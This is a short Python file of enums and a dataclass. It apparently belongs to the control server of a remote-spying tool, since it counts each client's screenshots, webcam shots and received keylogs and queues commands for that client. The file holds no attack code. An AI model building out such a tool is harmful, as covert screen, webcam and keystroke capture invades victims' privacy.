from dataclasses import dataclass, field
from typing import List
from enum import Enum


class DBIdentifiers(str, Enum):
    SCREENSHOT = 'screenshots_taken'
    WEBCAM = 'webcam_shots_taken'
    KEYLOG = 'keylogs_received'


class HTTPHeaders(str, Enum):
    DATETIME = 'Date'
    MAC = 'Mac-Address'
    CONTENT_TYPE = 'Content-Type'


@dataclass
class Client:
    commands: List[str] = field(default_factory=list)
    last_datetime: str = None
    screenshots_taken: int = 0
    webcam_shots_taken: int = 0
    keylogs_received: int = 0

